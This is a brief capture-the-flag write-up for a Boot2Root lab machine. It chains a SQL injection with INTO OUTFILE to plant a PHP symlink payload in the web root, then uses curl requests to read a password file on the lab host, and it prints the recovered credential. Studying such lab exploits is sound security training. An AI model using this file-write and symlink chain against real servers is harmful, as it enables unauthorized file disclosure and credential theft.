# Boot2Root - Bonus Challenge 3: Apache 2.2.22 suExec

## 1. Challenge Overview
**Challenge:** Apache 2.2.22 suExec - SQL Injection to write PHP payload

---

## 2. Steps

### 2.1 SQL Injection to write the PHP payload
```sql
SELECT '<?php symlink("/", "search.php"); echo "OK"; ?>'
INTO OUTFILE '/var/www/forum/templates_c/test3.php'
```

---

### 2.2 Payload execution
```bash
curl -ks "https://192.168.56.101/forum/templates_c/test3.php"
# Expected response: OK
```

---

### 2.3 Reading the sensitive file
```bash
curl -ks "https://192.168.56.101/forum/templates_c/search.php/home/LOOKATME/password"
# → lmezard:G!@M6f4Eatau{sF"
```

---

## 3. Result
**Sensitive file accessed successfully** ✅